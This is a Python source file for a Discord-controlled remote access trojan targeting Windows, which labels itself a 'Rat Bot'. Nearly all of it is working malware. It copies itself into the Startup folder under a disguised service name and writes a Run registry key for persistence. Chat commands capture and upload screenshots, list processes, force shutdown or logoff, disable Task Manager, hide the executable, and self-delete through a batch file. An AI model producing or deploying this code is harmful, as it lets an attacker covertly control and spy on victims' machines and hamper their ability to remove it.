import discord
import os
import sys
import subprocess
import winreg
import win32api
import win32con
import win32gui
import win32ui
import psutil
import pyautogui
import shutil
import tempfile
from discord.ext import commands
from PIL import ImageGrab

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

TOKEN = 'YOUR_BOT_TOKEN_HERE'

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await worm_behavior()

async def worm_behavior():
    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    exe_path = sys.executable
    dest_path = os.path.join(startup_path, 'system_service.exe')
    
    if not os.path.exists(dest_path):
        shutil.copy2(exe_path, dest_path)
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, dest_path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Registry error: {e}")

@bot.command()
async def help(ctx):
    commands_list = [
        "!help - Show available commands",
        "!info - Show system information",
        "!screenshot - Take a screenshot",
        "!worm - Establish worm persistence",
        "!processes - List running processes",
        "!shutdown - Shutdown the computer",
        "!restart - Restart the computer",
        "!logoff - Log off the current user",
        "!lock - Lock the workstation",
        "!delete - Self-destruct the bot",
        "!website - Open a website",
        "!message - Show a message box",
        "!disable_taskmgr - Disable Task Manager",
        "!enable_taskmgr - Enable Task Manager",
        "!hide_file - Hide the bot file"
    ]
    await ctx.send("\n".join(commands_list))

@bot.command()
async def info(ctx):
    info_msg = (
        f"Discord Rat Bot - System Info:\n"
        f"OS: Windows\n"
        f"Architecture: {os.environ['PROCESSOR_ARCHITECTURE']}\n"
        f"Bot Version: 1.0"
    )
    await ctx.send(info_msg)

@bot.command()
async def screenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
            screenshot.save(temp_file.name)
            await ctx.send(file=discord.File(temp_file.name))
        os.unlink(temp_file.name)
    except Exception as e:
        await ctx.send(f"Error taking screenshot: {e}")

@bot.command()
async def worm(ctx):
    await worm_behavior()
    await ctx.send("Worm persistence established.")

@bot.command()
async def processes(ctx):
    process_list = "Running processes:\n"
    for proc in psutil.process_iter(['name']):
        process_list += f"{proc.info['name']}\n"
    await ctx.send(process_list)

@bot.command()
async def shutdown(ctx):
    await ctx.send("Shutting down system...")
    os.system("shutdown /s /t 1")

@bot.command()
async def restart(ctx):
    await ctx.send("Restarting system...")
    os.system("shutdown /r /t 1")

@bot.command()
async def logoff(ctx):
    await ctx.send("Logging off user...")
    os.system("shutdown /l")

@bot.command()
async def lock(ctx):
    await ctx.send("Locking workstation...")
    win32api.LockWorkStation()

@bot.command()
async def delete(ctx):
    await ctx.send("Self-destruction initiated. Goodbye!")
    exe_path = sys.executable
    
    batch_cmd = f"""@echo off
timeout /t 2 >nul
del "{exe_path}"
del "{exe_path}"
del "%~f0"
"""
    
    temp_dir = tempfile.gettempdir()
    batch_path = os.path.join(temp_dir, 'clean.bat')
    
    with open(batch_path, 'w') as batch_file:
        batch_file.write(batch_cmd)
    
    subprocess.Popen(batch_path, shell=True)
    sys.exit(0)

@bot.command()
async def website(ctx):
    await ctx.send("Opening website...")
    subprocess.Popen('start https://www.example.com', shell=True)

@bot.command()
async def message(ctx):
    await ctx.send("Showing message box...")
    win32api.MessageBox(0, "You've been compromised!", "Warning", win32con.MB_ICONWARNING | win32con.MB_OK)

@bot.command()
async def disable_taskmgr(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        await ctx.send("Task Manager disabled.")
    except Exception as e:
        await ctx.send(f"Error disabling Task Manager: {e}")

@bot.command()
async def enable_taskmgr(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        await ctx.send("Task Manager enabled.")
    except Exception as e:
        await ctx.send(f"Error enabling Task Manager: {e}")

@bot.command()
async def hide_file(ctx):
    exe_path = sys.executable
    try:
        win32api.SetFileAttributes(exe_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
        await ctx.send("File hidden.")
    except Exception as e:
        await ctx.send(f"Error hiding file: {e}")

if __name__ == "__main__":
    bot.run(TOKEN)